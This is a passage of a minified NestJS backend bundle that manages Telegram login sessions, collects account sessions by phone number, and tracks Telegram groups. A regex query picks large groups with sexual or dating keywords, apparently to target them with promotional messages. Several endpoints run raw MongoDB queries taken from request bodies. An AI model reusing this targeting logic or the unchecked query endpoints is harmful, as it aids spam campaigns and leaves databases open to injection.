verification",example:"abc123xyz",required:!1}),o("design:type",String)],p.prototype,"phoneCodeHash",void 0),n([(0,r.ApiProperty)({description:"Whether the code was sent via app",example:!0,required:!1}),o("design:type",Boolean)],p.prototype,"isCodeViaApp",void 0),n([(0,r.ApiProperty)({description:"Session string for authenticated client",required:!1}),o("design:type",String)],p.prototype,"session",void 0),n([(0,r.ApiProperty)({description:"Whether 2FA is required",example:!1,required:!1}),o("design:type",Boolean)],p.prototype,"requires2FA",void 0)},7814:function(e,t,i){var n,o=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},a=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupController=void 0;const s=i(3563),c=i(9742),l=i(2431),p=i(3318);let d=n=class{constructor(e){this.tgSignupService=e,this.logger=new s.Logger(n.name)}async sendCode(e){try{this.logger.debug(`[SEND_CODE] Request received for phone: ${e.phone}`);const t=await this.tgSignupService.sendCode(e.phone);return{status:s.HttpStatus.CREATED,message:"Code sent to your Telegram App",phoneCodeHash:t.phoneCodeHash,isCodeViaApp:t.isCodeViaApp}}catch(t){throw this.logger.error(`[SEND_CODE] Error for phone: ${e.phone}`,{error:t,stack:t.stack}),t}}async verifyCode(e){try{this.logger.debug(`[VERIFY_CODE] Request received for phone: ${e.phone}`);const t=await this.tgSignupService.verifyCode(e.phone,e.code,e.password);return{status:t.requires2FA?s.HttpStatus.BAD_REQUEST:s.HttpStatus.OK,message:t.message||"Successfully logged in",session:t.session,requires2FA:t.requires2FA}}catch(t){throw this.logger.error(`[VERIFY_CODE] Error for phone: ${e.phone}`,{error:t,stack:t.stack}),t}}};t.TgSignupController=d,o([(0,s.Post)("send-code"),(0,c.ApiOperation)({summary:"Send verification code to phone number",description:"Initiates the signup process by sending a verification code via Telegram"}),(0,c.ApiResponse)({status:s.HttpStatus.CREATED,type:p.TgSignupResponse,description:"Code sent successfully"}),(0,c.ApiResponse)({status:s.HttpStatus.BAD_REQUEST,description:"Invalid phone number or failed to send code",schema:{type:"object",properties:{statusCode:{type:"number",example:400},message:{type:"string",example:"Invalid phone number format"},error:{type:"string",example:"Bad Request"}}}}),(0,c.ApiResponse)({status:s.HttpStatus.TOO_MANY_REQUESTS,description:"Rate limit exceeded"}),(0,c.ApiResponse)({status:s.HttpStatus.INTERNAL_SERVER_ERROR,description:"Internal server error occurred"}),a(0,(0,s.Body)()),r("design:type",Function),r("design:paramtypes",[p.SendCodeDto]),r("design:returntype",Promise)],d.prototype,"sendCode",null),o([(0,s.Post)("verify"),(0,c.ApiOperation)({summary:"Verify code and complete signup/login",description:"Verifies the code sent to phone and completes the signup/login process"}),(0,c.ApiResponse)({status:s.HttpStatus.OK,type:p.TgSignupResponse,description:"Verification successful"}),(0,c.ApiResponse)({status:s.HttpStatus.BAD_REQUEST,description:"Invalid code or verification failed"}),(0,c.ApiResponse)({status:s.HttpStatus.TOO_MANY_REQUESTS,description:"Rate limit exceeded"}),(0,c.ApiResponse)({status:s.HttpStatus.INTERNAL_SERVER_ERROR,description:"Internal server error occurred"}),a(0,(0,s.Body)()),r("design:type",Function),r("design:paramtypes",[p.VerifyCodeDto]),r("design:returntype",Promise)],d.prototype,"verifyCode",null),t.TgSignupController=d=n=o([(0,s.Controller)("tgsignup"),(0,c.ApiTags)("tgsignup"),(0,c.ApiExtraModels)(p.SendCodeDto,p.VerifyCodeDto,p.TgSignupResponse),r("design:paramtypes",[l.TgSignupService])],d)},7522:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsController=void 0;const a=i(3563),s=i(9155),c=i(3585),l=i(5926),p=i(9742),d=i(803);let u=class{constructor(e){this.activeChannelsService=e}async create(e){return this.activeChannelsService.create(e)}async createMultiple(e){return this.activeChannelsService.createMultiple(e)}search(e){return this.activeChannelsService.search(e)}async findAll(){return this.activeChannelsService.findAll()}async findOne(e){return this.activeChannelsService.findOne(e)}async update(e,t){return this.activeChannelsService.update(e,t)}async remove(e){return this.activeChannelsService.remove(e)}addReaction(e,t){if(!t.reactions)throw new a.BadRequestException("Reaction is required");return this.activeChannelsService.addReactions(e,t.reactions)}getRandomReaction(e){return this.activeChannelsService.getRandomReaction(e)}removeReaction(e,t){if(!t.reactions)throw new a.BadRequestException("Reaction is required");return this.activeChannelsService.removeReaction(e,t.reactions[0])}};t.ActiveChannelsController=u,n([(0,a.Post)(),(0,p.ApiOperation)({summary:"Create a new active channel"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[c.CreateActiveChannelDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Post)("createMultiple"),(0,p.ApiOperation)({summary:"Create multiple channels"}),(0,p.ApiBody)({type:[c.CreateActiveChannelDto]}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Array]),o("design:returntype",Promise)],u.prototype,"createMultiple",null),n([(0,a.Get)("search"),(0,p.ApiOperation)({summary:"Search channels by filters"}),(0,p.ApiQuery)({name:"channelId",required:!1,type:String}),(0,p.ApiQuery)({name:"broadcast",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"canSendMsgs",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"participantsCount",required:!1,type:Number}),(0,p.ApiQuery)({name:"restricted",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"sendMessages",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"title",required:!1,type:String}),(0,p.ApiQuery)({name:"username",required:!1,type:String}),(0,p.ApiQuery)({name:"wordRestriction",required:!1,type:Number}),(0,p.ApiQuery)({name:"dMRestriction",required:!1,type:Number}),(0,p.ApiQuery)({name:"availableMsgs",required:!1,type:[String]}),(0,p.ApiQuery)({name:"reactions",required:!1,type:[String]}),(0,p.ApiQuery)({name:"banned",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"reactRestricted",required:!1,type:Boolean}),(0,p.ApiQuery)({name:"megagroup",required:!1,type:Boolean}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"search",null),n([(0,a.Get)(),(0,p.ApiOperation)({summary:"Get all active channels"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Get)(":channelId"),(0,p.ApiOperation)({summary:"Get an active channel by channelId"}),r(0,(0,a.Param)("channelId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Patch)(":channelId"),(0,p.ApiOperation)({summary:"Update an active channel by channelId"}),r(0,(0,a.Param)("channelId")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,l.UpdateActiveChannelDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Delete)(":channelId"),(0,p.ApiOperation)({summary:"Delete an active channel by channelId"}),r(0,(0,a.Param)("channelId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"remove",null),n([(0,a.Post)(":channelId/reactions"),(0,p.ApiOperation)({summary:"Add reaction to chat group"}),r(0,(0,a.Param)("channelId")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.AddReactionDto]),o("design:returntype",Promise)],u.prototype,"addReaction",null),n([(0,a.Get)(":channelId/reactions/random"),(0,p.ApiOperation)({summary:"Get a random reaction from chat group"}),r(0,(0,a.Param)("channelId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"getRandomReaction",null),n([(0,a.Delete)(":channelId/reactions"),(0,p.ApiOperation)({summary:"Remove reaction from chat group"}),r(0,(0,a.Param)("channelId")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.AddReactionDto]),o("design:returntype",Promise)],u.prototype,"removeReaction",null),t.ActiveChannelsController=u=n([(0,p.ApiTags)("Active Channels"),(0,a.Controller)("active-channels"),o("design:paramtypes",[s.ActiveChannelsService])],u)},3322:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsModule=void 0;const o=i(3563),r=i(5839),a=i(9155),s=i(7522),c=i(925),l=i(5774),p=i(5014);let d=class{};t.ActiveChannelsModule=d,t.ActiveChannelsModule=d=n([(0,o.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:c.ActiveChannel.name,schema:c.ActiveChannelSchema}]),p.PromoteMsgModule],controllers:[s.ActiveChannelsController],providers:[a.ActiveChannelsService],exports:[a.ActiveChannelsService]})],d)},9155:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsService=void 0;const a=i(9199),s=i(3563),c=i(5839),l=i(6037),p=i(925),d=i(3235),u=i(9647),m=i(6250);let g=class{constructor(e,t){this.activeChannelModel=e,this.promoteMsgsService=t}async create(e){return e.availableMsgs=Object.keys(await this.promoteMsgsService.findOne()),new this.activeChannelModel(e).save()}async createMultiple(e){const t=e.map((e=>({updateOne:{filter:{channelId:e.channelId},update:{$set:e},upsert:!0}})));return await this.activeChannelModel.bulkWrite(t,{ordered:!1}),"Channels Saved"}async findAll(){return this.activeChannelModel.find().exec()}async findOne(e){const t=(await this.activeChannelModel.findOne({channelId:e}).exec())?.toJSON();return t}async update(e,t){return delete t._id,await this.activeChannelModel.findOneAndUpdate({channelId:e},{$set:t},{new:!0,upsert:!0}).exec()}async removeFromAvailableMsgs(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$pull:{availableMsgs:t}})}async addToAvailableMsgs(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$addToSet:{availableMsgs:t}})}async remove(e){await this.activeChannelModel.findOneAndDelete({channelId:e}).exec()}async search(e){return console.log(e),this.activeChannelModel.find(e).exec()}async addReactions(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$addToSet:{reactions:t}})}async getRandomReaction(e){const t=(await this.activeChannelModel.findOne({channelId:e}).exec())?.toJSON();if(!t)return;if(0===t.reactions.length)return;const i=Math.floor(Math.random()*t.reactions.length);return t.reactions[i]}async removeReaction(e,t){return await this.activeChannelModel.findOneAndUpdate({channelId:e},{$pull:{reactions:t}})}async getActiveChannels(e=50,t=0,i=[]){const n={$and:[{$or:[{title:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}},{username:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}}]},{$or:[{title:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}},{username:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}}]},{channelId:{$nin:i},participantsCount:{$gt:600},username:{$ne:null},canSendMsgs:!0,restricted:!1,forbidden:!1}]},o={participantsCount:-1};try{return await this.activeChannelModel.aggregate([{$match:n},{$skip:t},{$limit:e},{$sort:o},{$project:{randomField:0}}]).exec()}catch(e){return console.error("Error:",e),[]}}async executeQuery(e,t,i,n){try{if(!e)throw new s.BadRequestException("Query is invalid.");const o=this.activeChannelModel.find(e);return t&&o.sort(t),i&&o.limit(i),n&&o.skip(n),await o.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}async resetWordRestrictions(){await(0,u.fetchWithTimeout)(`${(0,m.notifbot)()}&text=Request Received for Reset Available Msgs`);try{await this.activeChannelModel.updateMany({banned:!1},{$set:{wordRestriction:0,dMRestriction:0}})}catch(e){console.log((0,d.parseError)(e))}}async resetAvailableMsgs(){await(0,u.fetchWithTimeout)(`${(0,m.notifbot)()}&text=Request Received for Reset Available Msgs`);try{const e=await this.promoteMsgsService.findOne(),t=Object.keys(e);await this.activeChannelModel.updateMany({$expr:{$lt:[{$size:{$ifNull:["$availableMsgs",[]]}},5]}},{$set:{wordRestriction:0,dMRestriction:0,banned:!1,availableMsgs:t}})}catch(e){console.log((0,d.parseError)(e))}}async updateBannedChannels(){await(0,u.fetchWithTimeout)(`${(0,m.notifbot)()}&text=Request Received for update banned Channels`),await this.activeChannelModel.updateMany({$or:[{banned:!0},{private:!0}]},{$set:{wordRestriction:0,dMRestriction:0,banned:!1,private:!1}})}async updateDefaultReactions(){await this.activeChannelModel.updateMany({},{$set:{reactions:["❤","🔥","👏","🥰","😁","🤔","🤯","😱","🤬","😢","🎉","🤩","🤮","💩","🙏","👌","🕊","🤡","🥱","🥴","😍","🐳","❤‍🔥","💯","🤣","💔","🏆","😭","😴","👍","🌚","⚡","🍌","😐","💋","👻","👀","🙈","🤝","🤗","🆒","🗿","🙉","🙊","🤷","👎"]}})}};t.ActiveChannelsService=g,t.ActiveChannelsService=g=n([(0,s.Injectable)(),r(0,(0,c.InjectModel)(p.ActiveChannel.name)),r(1,(0,s.Inject)((0,s.forwardRef)((()=>a.PromoteMsgsService)))),o("design:paramtypes",[l.Model,a.PromoteMsgsService])],g)},803:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AddReactionDto=void 0;const r=i(9742);class a{}t.AddReactionDto=a,n([(0,r.ApiProperty)({required:!0}),o("design:type",Array)],a.prototype,"reactions",void 0)},3585:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateActiveChannelDto=void 0;const r=i(9742);class a{constructor(){this.reactRestricted=!1,this.wordRestriction=0,this.dMRestriction=0,this.reactions=["❤","🔥","👏","🥰","😁","🤔","🤯","😱","🤬","😢","🎉","🤩","🤮","💩","🙏","👌","🕊","🤡","🥱","🥴","😍","🐳","❤‍🔥","💯","🤣","💔","🏆","😭","😴","👍","🌚","⚡","🍌","😐","💋","👻","👀","🙈","🤝","🤗","🆒","🗿","🙉","🙊","🤷","👎"],this.banned=!1,this.private=!1}}t.CreateActiveChannelDto=a,n([(0,r.ApiProperty)(),o("design:type",String)],a.prototype,"channelId",void 0),n([(0,r.ApiProperty)({default:!1}),o("design:type",Boolean)],a.prototype,"broadcast",void 0),n([(0,r.ApiProperty)({default:!0}),o("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),n([(0,r.ApiProperty)({default:300}),o("design:type",Number)],a.prototype,"participantsCount",void 0),n([(0,r.ApiProperty)({default:!1}),o("design:type",Boolean)],a.prototype,"restricted",void 0),n([(0,r.ApiProperty)({default:!0}),o("design:type",Boolean)],a.prototype,"sendMessages",void 0),n([(0,r.ApiProperty)({default:!1}),o("design:type",Boolean)],a.prototype,"reactRestricted",void 0),n([(0,r.ApiProperty)(),o("design:type",String)],a.prototype,"title",void 0),n([(0,r.ApiProperty)(),o("design:type",String)],a.prototype,"username",void 0),n([(0,r.ApiProperty)({default:0}),o("design:type",Number)],a.prototype,"wordRestriction",void 0),n([(0,r.ApiProperty)({default:0}),o("design:type",Number)],a.prototype,"dMRestriction",void 0),n([(0,r.ApiProperty)({type:[String]}),o("design:type",Array)],a.prototype,"availableMsgs",void 0),n([(0,r.ApiProperty)({type:[String],default:["❤","🔥","👏","🥰","😁","🤔","🤯","😱","🤬","😢","🎉","🤩","🤮","💩","🙏","👌","🕊","🤡","🥱","🥴","😍","🐳","❤‍🔥","💯","🤣","💔","🏆","😭","😴","👍","🌚","⚡","🍌","😐","💋","👻","👀","🙈","🤝","🤗","🆒","🗿","🙉","🙊","🤷","👎"]}),o("design:type",Array)],a.prototype,"reactions",void 0),n([(0,r.ApiProperty)({default:!1}),o("design:type",Boolean)],a.prototype,"banned",void 0),n([(0,r.ApiProperty)({default:!0,required:!1}),o("design:type",Boolean)],a.prototype,"megagroup",void 0),n([(0,r.ApiProperty)({default:!1,required:!1}),o("design:type",Boolean)],a.prototype,"forbidden",void 0),n([(0,r.ApiProperty)({description:"Whether the channel is private",example:!1,required:!1}),o("design:type",Boolean)],a.prototype,"private",void 0)},5926:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateActiveChannelDto=void 0;const n=i(9742),o=i(3585);class r extends((0,n.PartialType)(o.CreateActiveChannelDto)){}t.UpdateActiveChannelDto=r},925:function(e,t,i){var n=this&&this.__createBinding||(Object.create?function(e,t,i,n){void 0===n&&(n=i);var o=Object.getOwnPropertyDescriptor(t,i);o&&!("get"in o?!t.__esModule:o.writable||o.configurable)||(o={enumerable:!0,get:function(){return t[i]}}),Object.defineProperty(e,n,o)}:function(e,t,i,n){void 0===n&&(n=i),e[n]=t[i]}),o=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),r=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},a=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)"default"!==i&&Object.prototype.hasOwnProperty.call(e,i)&&n(t,e,i);return o(t,e),t},s=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelSchema=t.ActiveChannel=void 0;const c=i(5839),l=a(i(6037)),p=i(9742),d=i(6185);let u=class{};t.ActiveChannel=u,r([(0,p.ApiProperty)({required:!0}),(0,c.Prop)({required:!0,unique:!0}),s("design:type",String)],u.prototype,"channelId",void 0),r([(0,p.ApiProperty)({default:!1}),(0,c.Prop)({default:!1}),s("design:type",Boolean)],u.prototype,"broadcast",void 0),r([(0,p.ApiProperty)({default:!0}),(0,c.Prop)({default:!0}),s("design:type",Boolean)],u.prototype,"canSendMsgs",void 0),r([(0,p.ApiProperty)({type:Number,default:0}),(0,c.Prop)({type:l.Schema.Types.Number,default:0}),s("design:type",Number)],u.prototype,"participantsCount",void 0),r([(0,p.ApiProperty)({default:!1}),(0,c.Prop)({default:!1}),s("design:type",Boolean)],u.prototype,"restricted",void 0),r([(0,p.ApiProperty)({default:!1}),(0,c.Prop)({default:!1}),s("design:type",Boolean)],u.prototype,"sendMessages",void 0),r([(0,p.ApiProperty)({required:!0}),(0,c.Prop)({required:!0}),s("design:type",String)],u.prototype,"title",void 0),r([(0,p.ApiProperty)({required:!1,default:null}),(0,c.Prop)({required:!1,default:null}),s("design:type",String)],u.prototype,"username",void 0),r([(0,p.ApiProperty)({type:Number,default:0}),(0,c.Prop)({type:l.Schema.Types.Number,default:0}),s("design:type",Number)],u.prototype,"wordRestriction",void 0),r([(0,p.ApiProperty)({type:Number,default:0}),(0,c.Prop)({type:l.Schema.Types.Number,default:0}),s("design:type",Number)],u.prototype,"dMRestriction",void 0),r([(0,p.ApiProperty)({type:[String],default:d.defaultMessages}),(0,c.Prop)({type:[String],default:d.defaultMessages}),s("design:type",Array)],u.prototype,"availableMsgs",void 0),r([(0,p.ApiProperty)({type:[String],default:d.defaultReactions}),(0,c.Prop)({type:[String],default:d.defaultReactions}),s("design:type",Array)],u.prototype,"reactions",void 0),r([(0,p.ApiProperty)({default:!1}),(0,c.Prop)({default:!1}),s("design:type",Boolean)],u.prototype,"banned",void 0),r([(0,p.ApiProperty)({default:!0}),(0,c.Prop)({default:!0}),s("design:type",Boolean)],u.prototype,"megagroup",void 0),r([(0,p.ApiProperty)({default:!1}),(0,c.Prop)({default:!1}),s("design:type",Boolean)],u.prototype,"private",void 0),r([(0,p.ApiProperty)({default:!1}),(0,c.Prop)({default:!1}),s("design:type",Boolean)],u.prototype,"reactRestricted",void 0),r([(0,p.ApiProperty)({default:!1}),(0,c.Prop)({default:!1}),s("design:type",Boolean)],u.prototype,"forbidden",void 0),t.ActiveChannel=u=r([(0,c.Schema)({collection:"activeChannels",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],u),t.ActiveChannelSchema=c.SchemaFactory.createForClass(u)},6501:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientController=void 0;const a=i(3563),s=i(9742),c=i(9646),l=i(9815),p=i(1167),d=i(7908);let u=class{constructor(e){this.archivedclientService=e}async create(e){return this.archivedclientService.create(e)}async search(e){return this.archivedclientService.search(e)}async findAll(){return this.archivedclientService.findAll()}async checkArchivedClients(){return this.archivedclientService.checkArchivedClients()}async findOne(e){return this.archivedclientService.findOne(e)}async fetchOne(e){return this.archivedclientService.fetchOne(e)}async update(e,t){return this.archivedclientService.update(e,t)}async remove(e){return this.archivedclientService.remove(e)}async executeQuery(e){try{return await this.archivedclientService.executeQuery(e)}catch(e){throw e}}};t.ArchivedClientController=u,n([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[l.CreateClientDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),(0,s.ApiQuery)({name:"clientId",required:!1,description:"Client ID"}),(0,s.ApiQuery)({name:"dbcoll",required:!1,description:"Database collection name"}),(0,s.ApiQuery)({name:"channelLink",required:!1,description:"Channel link"}),(0,s.ApiQuery)({name:"link",required:!1,description:"Client link"}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[p.SearchClientDto]),o("design:returntype",Promise)],u.prototype,"search",null),n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Get)("checkArchivedClients"),(0,s.ApiOperation)({summary:"Get user data by ID"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"checkArchivedClients",null),n([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Get)("fetchOne/:mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"fetchOne",null),n([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.UpdateClientDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"remove",null),n([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"executeQuery",null),t.ArchivedClientController=u=n([(0,s.ApiTags)("Archived Clients"),(0,a.Controller)("archived-clients"),o("design:paramtypes",[c.ArchivedClientService])],u)},6061:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientModule=void 0;const o=i(3563),r=i(5839),a=i(1013),s=i(282),c=i(9646),l=i(6501),p=i(5774),d=i(8009);let u=class{};t.ArchivedClientModule=u,t.ArchivedClientModule=u=n([(0,o.Module)({imports:[p.initModule,r.MongooseModule.forFeature([{collection:"ArchivedClients",name:"ArchivedArchivedClientsModule",schema:a.ClientSchema}]),(0,o.forwardRef)((()=>s.TelegramModule)),(0,o.forwardRef)((()=>d.ClientModule))],controllers:[l.ArchivedClientController],providers:[c.ArchivedClientService],exports:[c.ArchivedClientService]})],u)},9646:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientService=void 0;const a=i(3563),s=i(5839),c=i(6037),l=i(2995),p=i(7385),d=i(5562),u=i(3235),m=i(3653);let g=class{constructor(e,t,i){this.archivedclientModel=e,this.telegramService=t,this.clientService=i}async 